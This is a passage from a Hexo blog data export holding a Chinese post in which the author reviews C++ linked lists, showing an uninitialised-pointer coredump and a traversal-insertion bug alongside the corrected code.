class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//cmake -DCMAKE_BUILD_TYPE=Debug .. -Dfile=link.cpp</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> list_element&#123;</div><div class=\"line\">\t<span class=\"keyword\">void</span>* data;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_element* next;</div><div class=\"line\">&#125;;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">\"hello world!\"</span>&lt;&lt;<span class=\"built_in\">endl</span>;</div><div class=\"line\">\t<span class=\"keyword\">char</span> *str1=<span class=\"string\">\"hello\"</span>;</div><div class=\"line\">\t<span class=\"keyword\">char</span> *str2=<span class=\"string\">\" world\"</span>;</div><div class=\"line\">    <span class=\"comment\">/* 测试方法一：非指针，从栈上分配 */</span></div><div class=\"line\">\tlist_element le;</div><div class=\"line\">\tlist_element le2;</div><div class=\"line\">\tle.data = (<span class=\"keyword\">void</span>*)str1;</div><div class=\"line\">\tle.next = &amp;le2;</div><div class=\"line\">\tle2.data = (<span class=\"keyword\">void</span>*)str2;</div><div class=\"line\">\tle2.next = <span class=\"literal\">NULL</span>;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"le.data=%s\\n\"</span>,le.data);</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"le.next.data=%s\\n\"</span>,le.next-&gt;data);</div><div class=\"line\">\t</div><div class=\"line\">    <span class=\"comment\">/* 测试方法二：指针，未malloc 会导致coredump */</span>\t</div><div class=\"line\">\tlist_element *linke;</div><div class=\"line\">\tlinke-&gt;data = (<span class=\"keyword\">void</span>*)str1;</div><div class=\"line\">\tlinke-&gt;next = <span class=\"literal\">NULL</span>;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"linke.data=%s\\n\"</span>,linke-&gt;data);</div><div class=\"line\">\t</div><div class=\"line\">\t</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>第一种写法，链表对象的内存是直接从栈上分配的，而第二个方法<strong>导致coredump的原因是定义了一个未指向的空指针，</strong><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">list_element *linke=(list_element *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> list_element));</div></pre></td></tr></table></figure></p>\n<h2 id=\"遍历和插入的遍历问题\"><a href=\"#遍历和插入的遍历问题\" class=\"headerlink\" title=\"遍历和插入的遍历问题\"></a>遍历和插入的遍历问题</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//cmake -DCMAKE_BUILD_TYPE=Debug .. -Dfile=link.cpp</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> list_element&#123;</div><div class=\"line\">\t<span class=\"keyword\">void</span>* data;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_element* next;</div><div class=\"line\">&#125;;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">\"hello world!\"</span>&lt;&lt;<span class=\"built_in\">endl</span>;</div><div class=\"line\"></div><div class=\"line\">\tlist_element *link= <span class=\"literal\">NULL</span>;</div><div class=\"line\">\tlist_element *head= <span class=\"literal\">NULL</span>;</div><div class=\"line\">\t</div><div class=\"line\">\tlist_element *item = (list_element *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> list_element));\t</div><div class=\"line\">\titem-&gt;data = (<span class=\"keyword\">void</span>*)<span class=\"number\">999</span>;</div><div class=\"line\">\titem-&gt;next = <span class=\"literal\">NULL</span>;</div><div class=\"line\">\tlink = item;</div><div class=\"line\">\thead = item;</div><div class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">10</span>;i++)&#123;</div><div class=\"line\">\t\tlist_element *item = (list_element *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> list_element));\t</div><div class=\"line\">\t\titem-&gt;data = (<span class=\"keyword\">void</span>*)i;</div><div class=\"line\">\t\titem-&gt;next = <span class=\"literal\">NULL</span>;</div><div class=\"line\">\t\t<span class=\"comment\">/*  错误写法\t\t*/</span></div><div class=\"line\">\t\t<span class=\"keyword\">while</span>(head)&#123;</div><div class=\"line\">\t\t\thead = head-&gt;next;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\thead = item;</div><div class=\"line\">\t\t</div><div class=\"line\">\t\t<span class=\"comment\">/* 正确写法</span></div><div class=\"line\">\t\twhile(head-&gt;next)&#123;</div><div class=\"line\">\t\t\thead = head-&gt;next;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\thead-&gt;next = item;</div><div class=\"line\">\t\t*/</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">while</span>(link)&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"print %d\\n\"</span>,link-&gt;data);</div><div class=\"line\">\t\tlink= link-&gt;next;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">\"end...\"</span>&lt;&lt;<span class=\"built_in\">endl</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>错误写法输出的问题是：总是只输出了第一个元素，百思不得其解，加了各种测试和调试代码，最后才领悟到：<strong>遍历后插入的循环要用while(head-&gt;next),和输出打印的while(head)不一样。</strong><br>为什么呢？<br>原因很简单，插入时当前指针已经为空了，进行赋值操作<code>head-&gt;next = item;</code>时已经和前面的链表断了联系，正确写法是判断如果<code>head-&gt;next == NULL</code>，就进行赋值<code>head-&gt;next = item</code>。</p>\n<h2 id=\"反思\"><a href=\"#反思\" class=\"headerlink\" title=\"反思\"></a>反思</h2><p>平时底层代码写得少，基本都忘光了，要多加学习。</p>\n","excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>最近在看《linux内核设计与实现》，里面讲到一些内核数据结构，首先第一个是<strong>链表</strong>。琢磨着自己很久没有写过数据结构，于是复习回顾盲写一个链表，结果这个报错cordump</p>\n<h2 id=\"第一个：指针和非指针\"><a href=\"#第一个：指针和非指针\" class=\"headerlink\" title=\"第一个：指针和非指针\"></a>第一个：指针和非指针</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//cmake -DCMAKE_BUILD_TYPE=Debug .. -Dfile=link.cpp</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> list_element&#123;</div><div class=\"line\">\t<span class=\"keyword\">void</span>* data;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_element* next;</div><div class=\"line\">&#125;;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">\"hello world!\"</span>&lt;&lt;<span class=\"built_in\">endl</span>;</div><div class=\"line\">\t<span class=\"keyword\">char</span> *str1=<span class=\"string\">\"hello\"</span>;</div><div class=\"line\">\t<span class=\"keyword\">char</span> *str2=<span class=\"string\">\" world\"</span>;</div><div class=\"line\">    <span class=\"comment\">/* 测试方法一：非指针，从栈上分配 */</span></div><div class=\"line\">\tlist_element le;</div><div class=\"line\">\tlist_element le2;</div><div class=\"line\">\tle.data = (<span class=\"keyword\">void</span>*)str1;</div><div class=\"line\">\tle.next = &amp;le2;</div><div class=\"line\">\tle2.data = (<span class=\"keyword\">void</span>*)str2;</div><div class=\"line\">\tle2.next = <span class=\"literal\">NULL</span>;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"le.data=%s\\n\"</span>,le.data);</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"le.next.data=%s\\n\"</span>,le.next-&gt;data);</div><div class=\"line\">\t</div><div class=\"line\">    <span class=\"comment\">/* 测试方法二：指针，未malloc 会导致coredump */</span>\t</div><div class=\"line\">\tlist_element *linke;</div><div class=\"line\">\tlinke-&gt;data = (<span class=\"keyword\">void</span>*)str1;</div><div class=\"line\">\tlinke-&gt;next = <span class=\"literal\">NULL</span>;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"linke.data=%s\\n\"</span>,linke-&gt;data);</div><div class=\"line\">\t</div><div class=\"line\">\t</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>第一种写法，链表对象的内存是直接从栈上分配的，而第二个方法<strong>导致coredump的原因是定义了一个未指向的空指针，</strong><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">list_element *linke=(list_element *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> list_element));</div></pre></td></tr></table></figure></p>\n<h2 id=\"遍历和插入的遍历问题\"><a href=\"#遍历和插入的遍历问题\" class=\"headerlink\" title=\"遍历和插入的遍历问题\"></a>遍历和插入的遍历问题</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//cmake -DCMAKE_BUILD_TYPE=Debug .. -Dfile=link.cpp</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">struct</span> list_element&#123;</div><div class=\"line\">\t<span class=\"keyword\">void</span>* data;</div><div class=\"line\">\t<span class=\"keyword\">struct</span> list_element* next;</div><div class=\"line\">&#125;;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">\"hello world!\"</span>&lt;&lt;<span class=\"built_in\">endl</span>;</div><div class=\"line\"></div><div class=\"line\">\tlist_element *link= <span class=\"literal\">NULL</span>;</div><div class=\"line\">\tlist_element *head= <span class=\"literal\">NULL</span>;</div><div class=\"line\">\t</div><div class=\"line\">\tlist_element *item = (list_element *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> list_element));\t</div><div class=\"line\">\titem-&gt;data = (<span class=\"keyword\">void</span>*)<span class=\"number\">999</span>;</div><div class=\"line\">\titem-&gt;next = <span class=\"literal\">NULL</span>;</div><div class=\"line\">\tlink = item;</div><div class=\"line\">\thead = item;</div><div class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">10</span>;i++)&#123;</div><div class=\"line\">\t\tlist_element *item = (list_element *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> list_element));\t</div><div class=\"line\">\t\titem-&gt;data = (<span class=\"keyword\">void</span>*)i;</div><div class=\"line\">\t\titem-&gt;next = <span class=\"literal\">NULL</span>;</div><div class=\"line\">\t\t<span class=\"comment\">/*  错误写法\t\t*/</span></div><div class=\"line\">\t\t<span class=\"keyword\">while</span>(head)&#123;</div><div class=\"line\">\t\t\thead = head-&gt;next;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\thead = item;</div><div class=\"line\">\t\t</div><div class=\"line\">\t\t<span class=\"comment\">/* 正确写法</div><div class=\"line\">\t\twhile(head-&gt;next)&#123;</div><div class=\"line\">\t\t\thead = head-&gt;next;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\thead-&gt;next = item;</div><div class=\"line\">\t\t*/</span></div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">while</span>(link)&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"print %d\\n\"</span>,link-&gt;data);</div><div class=\"line\">\t\tlink= link-&gt;next;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">\"end...\"</span>&lt;&lt;<span class=\"built_in\">endl</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>错误写法输出的问题是：总是只输出了第一个元素，百思不得其解，加了各种测试和调试代码，最后才领悟到：<strong>遍历后插入的循环要用while(head-&gt;next),和输出打印的while(head)不一样。</strong><br>为什么呢？<br>原因很简单，插入时当前指针已经为空了，进行赋值操作<code>head-&gt;next = item;</code>时已经和前面的链表断了联系，正确写法是判断如果<code>head-&gt;next == NULL</code>，就进行赋值<code>head-&gt;next = item</code>。</p>\n<h2 id=\"反思\"><a href=\"#反思\" class=\"headerlink\" title=\"反思\"></a>反思</h2><p>平时底层代码写得少，基本都忘光了，要多加学习。</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cixyddgpv00000dtqizqj5uyo","category_id":"cixyddgqg00040dtq6pp2jih4","_id":"cixyddgr900090dtq507czlrg"},{"post_id":"cixyddgq900020dtqcql8p6ti","category_id":"cixyddgr700080dtqraxkhbcs","_id":"cixyddgrd000b0dtqsum760jh"},{"post_id":"cixyddgqq00050dtqpxzyvjl0","category_id":"cixyddgr700080dtqraxkhbcs","_id":"cixyddgrf000d0dtqe5pochx9"},{"post_id":"cixyddgqs00060dtqggyslcy3","category_id":"cixyddgre000c0dtqqng9ui53","_id":"cixyddgrg000f0dtqovedsjds"},{"post_id":"cixyddgr000070dtqqgpxfb0j","category_id":"cixyddgr700080dtqraxkhbcs","_id":"cixyddgrh000g0dtq0j5rj3c6"}],"PostTag":[],"Tag":[]}}